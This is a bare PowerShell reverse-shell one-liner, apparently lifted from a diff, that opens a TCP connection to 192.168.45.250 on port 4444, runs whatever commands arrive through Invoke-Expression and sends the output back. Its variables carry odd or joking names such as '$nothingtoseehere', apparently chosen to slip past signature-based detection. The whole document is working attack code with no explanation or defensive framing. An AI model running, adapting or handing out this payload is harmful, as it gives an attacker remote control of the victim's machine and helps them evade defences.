$RnDoMM = New-Object Net.Sockets.TCPClient('192.168.45.250',4444);$cevalung = $RnDoMM.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $cevalung.Read($bytes, 0, $bytes.Length)) -ne 0){;$nothingtoseehere = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$dbackhere = (iex $nothingtoseehere 2>&1 | Out-String );$dbackhere2  = $dbackhere + '> ';$back2back = ([text.encoding]::ASCII).GetBytes($dbackhere2);$cevalung.Write($back2back,0,$back2back.Length);$cevalung.Flush()};$RnDoMM.Close()@@ -1 +1 @@
  

    
    
